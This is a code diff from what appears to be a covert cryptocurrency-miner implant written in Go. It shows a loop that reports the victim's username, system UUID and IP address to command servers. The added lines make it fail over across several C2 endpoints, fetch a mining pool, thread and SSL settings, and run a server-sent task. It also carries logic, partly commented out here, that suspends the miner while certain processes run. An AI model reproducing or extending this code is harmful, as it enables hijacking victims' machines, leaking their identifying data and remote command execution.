@@ -22,13 +22,13 @@ func runChecks() {
 		} else {
 			ResumeProcess(minerinfo.Process)
 		}
-		if checkProcessesForMatch(processNames) {
-			SuspendProcess(minerinfo.Process)
-			time.Sleep(10 * time.Second)
+		// if checkProcessesForMatch(processNames) {
+		// 	SuspendProcess(minerinfo.Process)
+		// 	time.Sleep(10 * time.Second)
 
-		} else {
-			ResumeProcess(minerinfo.Process)
-		}
+		// } else {
+		// 	ResumeProcess(minerinfo.Process)
+		// }
 
 		running := isProcessRunning(int(minerinfo.ProcessId))
 		if !running {
@@ -50,10 +50,8 @@ func runChecks() {
 	}
 }
 
-func getConfig() []string {
+func getConfig() {
 	for {
-		fmt.Println("endpoint url: " + endpointurl)
-
 		jsonData := map[string]string{
 			"pcname":     GetUsername() + "-" + getSystemUUID(),
 			"ip":         GetClientIP(),
@@ -67,22 +65,44 @@ func getConfig() []string {
 
 		jsonBytes, err := json.Marshal(jsonData)
 		if err != nil {
-			panic(err)
-		}
-
-		resp, err := http.Post(endpointurl, "application/json", bytes.NewReader(jsonBytes))
-		if err != nil {
+			fmt.Println("Error marshalling JSON:", err)
 			continue
 		}
-		bodyBytes, err := io.ReadAll(resp.Body)
-		if err != nil {
-			continue
-		}
-		fmt.Println(string(bodyBytes))
 
 		var data []Res
-		if err := json.Unmarshal(bodyBytes, &data); err != nil {
-			fmt.Println(err)
+		success := false
+
+		for _, endpoint := range endpoints {
+			fmt.Println("Trying endpoint:", endpoint)
+
+			resp, err := http.Post(endpoint, "application/json", bytes.NewReader(jsonBytes))
+			if err != nil {
+				fmt.Println("Request failed:", err)
+				continue
+			}
+			defer resp.Body.Close()
+
+			bodyBytes, err := io.ReadAll(resp.Body)
+			if err != nil {
+				fmt.Println("Failed to read response:", err)
+				continue
+			}
+
+			if err := json.Unmarshal(bodyBytes, &data); err != nil {
+				fmt.Println("Failed to parse JSON:", err)
+				continue
+			}
+
+			if len(data) > 0 {
+				success = true
+				break
+			}
+		}
+
+		if !success {
+			fmt.Println("All endpoints failed, retrying in 10 seconds...")
+			time.Sleep(10 * time.Second)
+			continue
 		}
 
 		miningpool = data[0].Pool
@@ -91,9 +111,11 @@ func getConfig() []string {
 		threads = data[0].Threads
 		idle_time = data[0].IdleTime
 		idlethreads = data[0].IdleThreads
+		ssl = data[0].Ssl
+
 		fmt.Println("Task:", data[0].Task)
 		go HandleTask(data[0].Task)
+
 		time.Sleep(25 * time.Second)
 	}
-
 }
